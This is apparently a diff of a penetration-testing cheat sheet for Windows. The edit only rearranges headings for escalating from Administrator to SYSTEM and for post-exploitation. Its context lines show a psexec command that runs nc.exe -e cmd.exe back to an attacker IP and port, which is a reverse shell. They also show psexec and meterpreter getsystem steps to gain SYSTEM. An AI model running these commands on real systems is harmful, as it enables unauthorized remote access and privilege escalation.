@@ -528,9 +528,7 @@ psexec.exe -s -i -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD>
 psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e cmd.exe <IP> <PORT>
 ```
 
-### Post-Exploit
-
-#### Administrator to SYSTEM
+### Administrator to SYSTEM
 
 The system account and the administrator account (Administrators group) have
 the same file privileges, but they have different functions.  
@@ -553,6 +551,8 @@ psexec.exe -accepteula -s -i -d cmd.exe
 ```
 
 If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.
+
+### Post-Exploit
 
 #### Add local Administrator
 
